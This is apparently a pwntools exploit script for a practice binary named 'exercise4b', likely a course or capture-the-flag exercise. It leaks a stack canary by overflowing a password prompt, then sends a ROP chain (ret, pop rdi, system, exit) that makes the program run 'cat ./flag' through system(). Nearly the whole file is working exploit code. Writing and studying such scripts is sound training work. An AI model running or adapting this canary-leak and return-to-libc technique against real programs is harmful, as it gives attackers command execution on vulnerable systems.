#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4012e5
b *0x4012ed
b *0x401342
b *0x155555370410

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
pop_rdi_ret = 0x0000000000401543
ret = 0x000000000040101a
clear_8 = 0x0000000000401016
#system_address = 0x7f71307b2410
#exit_address = 0x7f71307a6bc0
#name = 0x7f713094dc60



#system_address = 0x155555370410
#exit_address = 0x155555364bc0
#name = 0x15555550bc60
name = 0x004040a0

leak_canary = b'A'*19

e = ELF(exe)

r = start()
#pause()
r.recvuntil(b" your name?\n")

system_address = r.libc.symbols["system"]
exit_address = r.libc.symbols["exit"]
#bin_sh = next(r.libc.search(b'/bin/sh\0'))
base_address = r.libs()[e.path]
#e.address += base_address     # breaks everything !!
rop = ROP(e)

ret = rop.ret[0]
pop_rdi_ret = rop.rdi[0]



r.sendline(b"cat ./flag")
r.recvuntil(b" password:\n")
r.sendline(leak_canary)

leak = r.recvuntil(b"is not the password\n")
print(leak)
canary = leak[15+20:15+20+4]
print(canary)
print(canary.hex())

r.recvuntil(b" password:\n")

#shellcode = b'A'*16 + b'\0'*4 + canary + b'A'*16 + p64(system_address) + b'A'*8 + b'\n'
shellcode = b'A'*16 + p32(0x00401190) + canary + b'A'*16 + p64(ret) + p64(pop_rdi_ret) + p64(name) + p64(system_address) + p64(ret) + p64(exit_address)

r.sendline(shellcode)

print(r.recvall().decode(errors='ignore'))


# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

